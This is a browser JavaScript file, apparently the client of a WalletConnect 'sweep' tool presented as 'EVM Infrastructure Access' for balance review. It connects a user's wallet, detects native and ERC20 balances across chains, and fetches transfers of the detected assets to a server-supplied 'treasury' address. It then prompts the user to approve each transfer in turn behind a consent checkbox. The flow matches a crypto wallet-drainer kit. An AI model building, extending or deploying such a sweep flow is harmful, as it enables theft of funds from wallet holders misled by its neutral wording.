import EthereumProvider from "https://esm.sh/@walletconnect/ethereum-provider@2.21.8";

const CONSENT_TEXT = "I understand and consent to the wallet interaction and automation flow.";

const state = {
  provider: null,
  config: null,
  syncResult: null,
  sweepPlan: null,
  walletAddress: "",
  approvedChains: []
};

const elements = {
  apiBaseUrl: document.querySelector("#apiBaseUrl"),
  consentCheckbox: document.querySelector("#consentCheckbox"),
  walletAddress: document.querySelector("#walletAddress"),
  networkGrid: document.querySelector("#networkGrid"),
  sweepPreview: document.querySelector("#sweepPreview"),
  status: document.querySelector("#status"),
  transferStatus: document.querySelector("#transferStatus"),
  connectWallet: document.querySelector("#connectWallet"),
  syncWallet: document.querySelector("#syncWallet"),
  disconnectWallet: document.querySelector("#disconnectWallet"),
  prepareSweep: document.querySelector("#prepareSweep"),
  approveSweep: document.querySelector("#approveSweep")
};

const savedApiBase = localStorage.getItem("EVM_WALLETCONNECT_API_BASE_URL");
if (savedApiBase) {
  elements.apiBaseUrl.value = savedApiBase;
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

function setStatus(message, payload) {
  const suffix = payload ? `\n\n${JSON.stringify(payload, null, 2)}` : "";
  elements.status.textContent = `${message}${suffix}`;
}

function setTransferStatus(message, payload) {
  const suffix = payload ? `\n\n${JSON.stringify(payload, null, 2)}` : "";
  elements.transferStatus.textContent = `${message}${suffix}`;
}

function apiBaseUrl() {
  const value = elements.apiBaseUrl.value.trim().replace(/\/$/, "");
  localStorage.setItem("EVM_WALLETCONNECT_API_BASE_URL", value);
  return value;
}

function detectedAssets() {
  const assets = [];

  for (const chain of state.syncResult?.chains ?? []) {
    if (chain.balanceWei !== "0") {
      assets.push({
        chainId: chain.chainId,
        chainName: chain.chainName,
        assetType: "native",
        symbol: chain.symbol,
        balanceRaw: chain.balanceWei,
        balanceFormatted: chain.balanceFormatted
      });
    }

    for (const token of chain.tokens ?? []) {
      if (token.balanceRaw !== "0") {
        assets.push({
          chainId: chain.chainId,
          chainName: chain.chainName,
          assetType: "erc20",
          tokenAddress: token.address,
          symbol: token.symbol,
          balanceRaw: token.balanceRaw,
          balanceFormatted: token.balanceFormatted
        });
      }
    }
  }

  return assets;
}

function updateActions() {
  const hasConsent = elements.consentCheckbox.checked;
  const connected = Boolean(state.walletAddress);
  const synced = Boolean(state.syncResult?.chains?.length);
  const hasDetectedAssets = detectedAssets().length > 0;
  const hasPreparedTransfers = Boolean(state.sweepPlan?.transfers?.length);

  elements.connectWallet.disabled = !hasConsent || connected;
  elements.syncWallet.disabled = !connected;
  elements.disconnectWallet.disabled = !connected;
  elements.prepareSweep.disabled = !synced || !hasDetectedAssets;
  elements.approveSweep.disabled = !hasPreparedTransfers || !state.provider;
}

function renderNetworks(syncResult) {
  const chains = syncResult?.chains ?? state.config?.supportedChains ?? [];

  elements.networkGrid.innerHTML = chains
    .map((chain) => {
      const balance = chain.balanceFormatted
        ? `${Number(chain.balanceFormatted).toLocaleString(undefined, {
            maximumFractionDigits: 6
          })} ${chain.symbol}`
        : chain.symbol;
      const tokenCount = chain.tokens?.filter((token) => token.balanceRaw !== "0").length ?? 0;

      return `
        <article class="network">
          <span>${escapeHtml(chain.name || chain.chainName)}</span>
          <strong>${escapeHtml(balance)}</strong>
          ${chain.blockNumber ? `<small>Block ${escapeHtml(chain.blockNumber)}</small>` : ""}
          <small>${tokenCount} supported token${tokenCount === 1 ? "" : "s"} with balance</small>
        </article>
      `;
    })
    .join("");
}

function formatDisplayAmount(value) {
  const numeric = Number(value);

  if (!Number.isFinite(numeric)) {
    return value;
  }

  return numeric.toLocaleString(undefined, { maximumFractionDigits: 8 });
}

function renderDetectedPlan() {
  const assets = detectedAssets();
  const destination = state.config?.treasuryAddress ?? "Not loaded";

  if (!state.syncResult) {
    elements.sweepPreview.innerHTML = `<p class="empty-note">Connect and synchronize a wallet to build a transfer plan.</p>`;
    return;
  }

  if (assets.length === 0) {
    elements.sweepPreview.innerHTML = `<p class="empty-note">No supported balances were detected.</p>`;
    return;
  }

  elements.sweepPreview.innerHTML = `
    <div class="sweep-destination">
      <span>Destination</span>
      <code>${escapeHtml(destination)}</code>
    </div>
    ${assets
      .map(
        (asset) => `
          <article class="sweep-item">
            <div>
              <strong>${escapeHtml(asset.symbol)}</strong>
              <span>${escapeHtml(asset.chainName)} · ${asset.assetType === "native" ? "Native" : "ERC20"}</span>
            </div>
            <code>${escapeHtml(formatDisplayAmount(asset.balanceFormatted))}</code>
          </article>
        `
      )
      .join("")}
  `;
}

function renderPreparedPlan(plan) {
  const preparedRows = plan.transfers
    .map(
      (transfer, index) => `
        <article class="sweep-item ready">
          <div>
            <strong>${index + 1}. ${escapeHtml(transfer.tokenSymbol)}</strong>
            <span>${escapeHtml(transfer.chainName)} · ${transfer.assetType === "native" ? "Native" : "ERC20"}</span>
            <small>Gas estimate: ${escapeHtml(transfer.estimatedNetworkFeeFormatted)} native</small>
          </div>
          <code>${escapeHtml(formatDisplayAmount(transfer.amountFormatted))}</code>
        </article>
      `
    )
    .join("");
  const skippedRows = plan.skipped
    .map(
      (asset) => `
        <article class="sweep-item skipped">
          <div>
            <strong>${escapeHtml(asset.tokenSymbol)}</strong>
            <span>${escapeHtml(asset.chainName)} · skipped</span>
            <small>${escapeHtml(asset.reason)}</small>
          </div>
          <code>${escapeHtml(formatDisplayAmount(asset.balanceFormatted))}</code>
        </article>
      `
    )
    .join("");

  elements.sweepPreview.innerHTML = `
    <div class="sweep-destination">
      <span>Destination</span>
      <code>${escapeHtml(plan.treasuryAddress)}</code>
    </div>
    ${preparedRows || `<p class="empty-note">No transfers could be prepared.</p>`}
    ${skippedRows ? `<div class="sweep-skipped">${skippedRows}</div>` : ""}
  `;
}

async function getJson(path) {
  const response = await fetch(`${apiBaseUrl()}${path}`);
  const payload = await response.json().catch(() => ({}));

  if (!response.ok) {
    throw new Error(payload.error || `Request failed with status ${response.status}`);
  }

  return payload;
}

async function postJson(path, body) {
  const response = await fetch(`${apiBaseUrl()}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });

  const payload = await response.json().catch(() => ({}));

  if (!response.ok) {
    throw new Error(payload.error || `Request failed with status ${response.status}`);
  }

  return payload;
}

async function loadConfig() {
  if (state.config) {
    return state.config;
  }

  state.config = await getJson("/api/wallet/config");
  renderNetworks();
  renderDetectedPlan();
  return state.config;
}

function parseSessionChains(provider, supportedChains) {
  const supported = new Set(supportedChains.map((chain) => chain.id));
  const namespaceAccounts = provider.session?.namespaces?.eip155?.accounts ?? [];
  const chainIds = namespaceAccounts
    .map((account) => Number(account.split(":")[1]))
    .filter((chainId) => supported.has(chainId));

  if (provider.chainId && supported.has(Number(provider.chainId))) {
    chainIds.push(Number(provider.chainId));
  }

  return [...new Set(chainIds.length ? chainIds : supportedChains.map((chain) => chain.id))];
}

async function initProvider(config) {
  const chainIds = config.supportedChains.map((chain) => chain.id);
  const requiredChain = chainIds[0];
  const optionalChains = chainIds.filter((chainId) => chainId !== requiredChain);

  const provider = await EthereumProvider.init({
    projectId: config.walletConnectProjectId,
    chains: [requiredChain],
    optionalChains,
    showQrModal: true,
    methods: config.walletConnect.methods,
    optionalMethods: config.walletConnect.methods,
    events: config.walletConnect.events,
    optionalEvents: config.walletConnect.events,
    metadata: {
      name: "EVM Infrastructure Access",
      description: "WalletConnect session for balance review and wallet-approved transfers.",
      url: window.location.origin,
      icons: [`${window.location.origin}/favicon.ico`]
    }
  });

  provider.on("accountsChanged", (accounts) => {
    if (accounts?.[0]) {
      state.walletAddress = accounts[0];
      elements.walletAddress.textContent = accounts[0];
      state.sweepPlan = null;
      updateActions();
    }
  });

  provider.on("chainChanged", () => {
    if (state.walletAddress) {
      syncWallet().catch((error) => setStatus(error.message));
    }
  });

  provider.on("disconnect", () => {
    resetConnection("Wallet disconnected.");
  });

  return provider;
}

async function connectWallet() {
  if (!elements.consentCheckbox.checked) {
    setStatus("Consent is required before connection.");
    return;
  }

  setStatus("Opening WalletConnect...");
  const config = await loadConfig();
  const provider = await initProvider(config);

  await provider.connect();
  const accounts = await provider.request({ method: "eth_accounts" });

  if (!accounts?.[0]) {
    throw new Error("No account was returned by the wallet.");
  }

  state.provider = provider;
  state.walletAddress = accounts[0];
  state.approvedChains = parseSessionChains(provider, config.supportedChains);
  elements.walletAddress.textContent = state.walletAddress;
  updateActions();

  await postJson("/api/wallet/session", {
    walletAddress: state.walletAddress,
    connector: "walletconnect-v2",
    chains: state.approvedChains,
    consentGranted: true,
    consentText: CONSENT_TEXT
  });

  await syncWallet();
}

async function syncWallet() {
  if (!state.walletAddress) {
    setStatus("Connect a wallet first.");
    return;
  }

  setStatus("Synchronizing supported networks...");
  const result = await postJson("/api/wallet/sync", {
    walletAddress: state.walletAddress,
    chains: state.approvedChains
  });

  state.syncResult = result;
  state.sweepPlan = null;
  renderNetworks(result);
  renderDetectedPlan();
  setTransferStatus("Review the detected balances, then prepare unsigned transfer requests.");
  setStatus("Wallet synchronized.", result);
  updateActions();
}

async function prepareSweepTransfers() {
  if (!state.walletAddress || !state.syncResult) {
    setTransferStatus("Connect and synchronize a wallet first.");
    return;
  }

  setTransferStatus("Preparing unsigned transfer requests...");
  const plan = await postJson("/api/transfer/prepare-all", {
    walletAddress: state.walletAddress,
    chains: state.approvedChains
  });

  state.sweepPlan = plan;
  renderPreparedPlan(plan);
  updateActions();

  if (plan.transfers.length === 0) {
    setTransferStatus("No transfers were prepared. Review skipped assets for details.", {
      skipped: plan.skipped
    });
    return;
  }

  setTransferStatus(`Prepared ${plan.transfers.length} unsigned transfer request(s). Start wallet approvals when ready.`, {
    skippedCount: plan.skipped.length,
    destination: plan.treasuryAddress
  });
}

async function approveSweepTransfers() {
  const plan = state.sweepPlan;

  if (!plan?.transfers?.length || !state.provider) {
    setTransferStatus("Prepare transfer requests first.");
    return;
  }

  const submitted = [];

  for (const [index, transfer] of plan.transfers.entries()) {
    setTransferStatus(`Opening wallet approval ${index + 1} of ${plan.transfers.length}...`, {
      chain: transfer.chainName,
      asset: transfer.tokenSymbol,
      amount: transfer.amountFormatted
    });

    await state.provider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: transfer.txRequest.chainId }]
    });

    const txHash = await state.provider.request({
      method: "eth_sendTransaction",
      params: [
        {
          from: transfer.txRequest.from,
          to: transfer.txRequest.to,
          value: transfer.txRequest.value,
          data: transfer.txRequest.data || "0x",
          gas: transfer.txRequest.gas
        }
      ]
    });

    const execution = await postJson("/api/transfer/execute", {
      transferId: transfer.transferId,
      walletAddress: state.walletAddress,
      chainId: transfer.chainId,
      txHash
    });

    submitted.push({
      chain: transfer.chainName,
      asset: transfer.tokenSymbol,
      amount: transfer.amountFormatted,
      txHash: execution.txHash
    });
  }

  state.sweepPlan = null;
  updateActions();

  await syncWallet();
  setTransferStatus(`Submitted ${submitted.length} wallet-approved transfer(s).`, { submitted });
}

async function disconnectWallet() {
  if (state.provider?.disconnect) {
    await state.provider.disconnect();
  }

  resetConnection("Wallet disconnected.");
}

function resetConnection(message) {
  state.provider = null;
  state.walletAddress = "";
  state.approvedChains = [];
  state.syncResult = null;
  state.sweepPlan = null;
  elements.walletAddress.textContent = "Not connected";
  renderNetworks();
  renderDetectedPlan();
  updateActions();
  setTransferStatus("Connect and synchronize a wallet to build a transfer plan.");
  setStatus(message);
}

function handleAsync(fn, setError = setStatus) {
  return async () => {
    try {
      await fn();
    } catch (error) {
      setError(error instanceof Error ? error.message : "Unexpected error");
      updateActions();
    }
  };
}

elements.consentCheckbox.addEventListener("change", () => {
  updateActions();
  setStatus(elements.consentCheckbox.checked ? "Ready to connect." : "Consent is required before connection.");
});
elements.connectWallet.addEventListener("click", handleAsync(connectWallet));
elements.syncWallet.addEventListener("click", handleAsync(syncWallet));
elements.disconnectWallet.addEventListener("click", handleAsync(disconnectWallet));
elements.prepareSweep.addEventListener("click", handleAsync(prepareSweepTransfers, setTransferStatus));
elements.approveSweep.addEventListener("click", handleAsync(approveSweepTransfers, setTransferStatus));

loadConfig()
  .then(() => updateActions())
  .catch((error) => {
    const message = error instanceof Error ? error.message : "Unable to load backend configuration.";
    setStatus(message);
    setTransferStatus(message);
    updateActions();
  });
